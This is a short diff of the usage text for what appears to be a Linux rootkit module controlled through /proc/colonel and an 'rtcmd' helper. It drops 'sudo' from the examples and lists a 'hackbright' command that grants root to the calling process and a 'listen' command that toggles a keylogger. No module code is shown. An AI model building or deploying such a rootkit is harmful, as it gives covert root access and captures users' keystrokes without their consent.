@@ -144,9 +144,9 @@ USAGE:\n\
   From command line --\n\
   $ echo -n <command> >> /proc/colonel\n\n\
   From rtcmd --\n\
-  $ sudo ./rtcmd <command>\n\n\
+  $ ./rtcmd <command>\n\n\
   To get root access --\n\
-  $ sudo ./rtcmd hackbright /bin/bash\n\n\
+  $ ./rtcmd hackbright /bin/bash\n\n\
 COMMANDS:\n\
   hackbright - uid and gid 0 for writing process\n\
   listen - toggles keylogger listening on/off\n\
